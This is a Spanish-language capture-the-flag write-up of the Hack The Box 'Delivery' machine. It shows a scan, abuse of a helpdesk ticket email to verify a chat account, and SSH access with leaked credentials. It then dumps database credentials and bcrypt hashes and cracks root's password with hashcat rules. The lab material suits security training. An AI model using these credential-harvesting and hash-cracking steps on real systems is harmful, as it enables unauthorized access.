---
tags:
title: Delivery - Easy (HTB)
permalink: /Delivery-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80,8065 10.129.236.42                                      
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-24 12:47 -0500
Nmap scan report for helpdesk.delivery.htb (10.129.236.42)
Host is up (0.56s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: delivery
8065/tcp open  http    Golang net/http server
|_http-title: Mattermost
| http-robots.txt: 1 disallowed entry 
|_/
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 24 Dec 2025 17:46:31 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 3h483uoiqibn8b7y3o19zpdzwh
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Wed, 24 Dec 2025 17:50:42 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 24 Dec 2025 17:46:31 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: npaw43k9tp868josrrmat39k8c
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Wed, 24 Dec 2025 17:50:14 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Wed, 24 Dec 2025 17:50:16 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.98%I=7%D=12/24%Time=694C273B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:
SF:\x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public
SF:\r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancest
SF:ors\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Wed,\x2024
SF:\x20Dec\x202025\x2017:46:31\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\
SF:nX-Request-Id:\x20npaw43k9tp868josrrmat39k8c\r\nX-Version-Id:\x205\.30\
SF:.0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Wed,\
SF:x2024\x20Dec\x202025\x2017:50:14\x20GMT\r\n\r\n<!doctype\x20html><html\
SF:x20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"viewpor
SF:t\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1,use
SF:r-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20nofoll
SF:ow\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>Matte
SF:rmost</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"yes\
SF:"><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><meta\x2
SF:0name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re")%r(
SF:HTTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x
SF:20Wed,\x2024\x20Dec\x202025\x2017:50:16\x20GMT\r\nContent-Length:\x200\
SF:r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,D
SF:F3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
SF:\x20no-cache,\x20max-age=31556926,\x20public\r\nContent-Length:\x203108
SF:\r\nContent-Security-Policy:\x20frame-ancestors\x20'self';\x20script-sr
SF:c\x20'self'\x20cdn\.rudderlabs\.com\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nLast-Modified:\x20Wed,\x2024\x20Dec\x202025\x2017:46:31
SF:\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Request-Id:\x203h483uoiq
SF:ibn8b7y3o19zpdzwh\r\nX-Version-Id:\x205\.30\.0\.5\.30\.1\.57fb31b889bf8
SF:1d99d8af8176d4bbaaa\.false\r\nDate:\x20Wed,\x2024\x20Dec\x202025\x2017:
SF:50:42\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><meta\
SF:x20charset=\"utf-8\"><meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,initial-scale=1,maximum-scale=1,user-scalable=0\"><meta\x20nam
SF:e=\"robots\"\x20content=\"noindex,\x20nofollow\"><meta\x20name=\"referr
SF:er\"\x20content=\"no-referrer\"><title>Mattermost</title><meta\x20name=
SF:\"mobile-web-app-capable\"\x20content=\"yes\"><meta\x20name=\"applicati
SF:on-name\"\x20content=\"Mattermost\"><meta\x20name=\"format-detection\"\
SF:x20content=\"telephone=no\"><link\x20re");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.90 seconds
```

## Website 

La pagina es estática por ende no tiene nada de contenido.

![image-center](/assets/images/Pasted image 20251224144707.png)
## helpdesk.delivery.htb

Si clickeo en la pagina principal me redirige al dominio `helpdesk.delivery.htb`.
### osTicket

En la misma corre el Software de `osTicket`.

![image-center](/assets/images/Pasted image 20251224144655.png)

Le di a crear un nuevo ticket y proporcione mis datos, lo registre con el email `testing@delivery.htb`.

![image-center](/assets/images/Pasted image 20251224150736.png)

Luego de aca no encontre alguna via para poder acceder al panel de la pagina, y ni siquiera iniciar sesion como agente de la misma.
## Mattermost / Port 8065

En el puerto corre el servicio de `mattermost`. Puedo registrar una cuenta.

![image-center](/assets/images/Pasted image 20251224145750.png)

### Temp email

La misma la registre usando el email temporal que se me asigno al crear el `ticket`, haciendo que cuando vuelvo a la pagina, en la sección de `View Ticket Thread`, veo que me llego el correo de confirmacion a mi casilla de ticket.

![image-center](/assets/images/Pasted image 20251224151108.png)
### Access to mattermost
## SSH as maildeliverer

Si copio el enlace y lo pego en la url, veo que me sale un mensaje de que mi email fue verificado.

![image-center](/assets/images/Pasted image 20251224151231.png)

Al entrar al panel de `mattermost` no veo mucho.

![image-center](/assets/images/Pasted image 20251224151302.png)
### Credentials

Pero en una conversacion en el canal `Internal`, veo que el usuario `root` comenta sobre unas credenciales.

![image-center](/assets/images/Pasted image 20251224151429.png)
### Auth

Unas son validas para el login por `ssh`.

```bash
ssh maildeliverer@delivery.htb                                                       
maildeliverer@delivery.htb's password: 
<SNIP>

maildeliverer@Delivery:~$ cat user.txt 
2def92ca946490a7e8ecfc26e4a4ad30
```

## Shell as root

Yendo al directorio `/opt` veo la carpeta del servicio de `mattermost`, con un archivo de configuración en formato `json`, con las credenciales de conexión a la base de datos MySQL de la maquina.

```bash
maildeliverer@Delivery:/opt/mattermost/config$ cat config.json
 "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
```
### SQL

Me conecte a la misma con el siguiente comando, y seleccione la base de datos de `mattermost`.

```bash
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 196
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use mattermost
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```

Liste las tablas.

```sql
MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| Channels               |
| ClusterDiscovery       |
| CommandWebhooks        |
| Commands               |
| Compliances            |
| Emoji                  |
| FileInfo               |
| GroupChannels          |
| GroupMembers           |
| GroupTeams             |
| IncomingWebhooks       |
| Jobs                   |
| Licenses               |
| LinkMetadata           |
| OAuthAccessData        |
| OAuthApps              |
| OAuthAuthData          |
| OutgoingWebhooks       |
| PluginKeyValueStore    |
| Posts                  |
| Preferences            |
| ProductNoticeViewState |
| PublicChannels         |
| Reactions              |
| Roles                  |
| Schemes                |
| Sessions               |
| SidebarCategories      |
| SidebarChannels        |
| Status                 |
| Systems                |
| TeamMembers            |
| Teams                  |
| TermsOfService         |
| ThreadMemberships      |
| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.000 sec)
```
### Hashes

Y de la tabla `users` solo extraje los nombres de `usuario` y las `passwords`, las cuales parecen estar cifradas en formato `bcrypt`.

```bash
MariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| zs1n                             | $2a$10$z5UMXhAZ1.bYgsURv943Mu5n5JwEcu.S4RIy7Nq3O/sFiUxrCbCna |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| test                             | $2a$10$P54y6XkxXT2wpH88.i19weJNv5MNTtLuzT7ggQxWyggmEjflM0QxG |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
```
### Cracking password

Para romper el hash, no use el diccionario habitual de `rockyou`, porque me acorde del mensaje de `root` en la pagina que comenta sobre la password : `PleaseSubscribe!`, el cual el mismo comenta que no se encuentra en dicho diccionarios de passwords, por lo que metí la misma en un archivo y la rompí, aunque por intuición propia intuye que no iba a ser la correcta, pero como la maquina salió en `2021`, podría ser algo como `PleaseSubscribe!2021` o `PleaseSubscribe!21` lo cual la segunda es valida, de todas formas para descifrarla, use reglas de mutación la cuales convierte una lista de contraseñas como `admin` a `admin1, admin25`, y así.

```bash
hashcat -m 3200 hashes pass -r /usr/share/hashcat/rules/best66.rule                                                                                                 
hashcat (v7.1.2) starting
<SNIP>   

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
<SNIP>
```
## Shell 

Use la misma para convertirme en `root` desde dentro de la maquina.

```bash
maildeliverer@Delivery:/opt/mattermost$ su root
Password: 
root@Delivery:/opt/mattermost# cat /root/root.txt 
dacd810266ea68feb319a7d26a69c5d1
```

`~Happy Hacking.`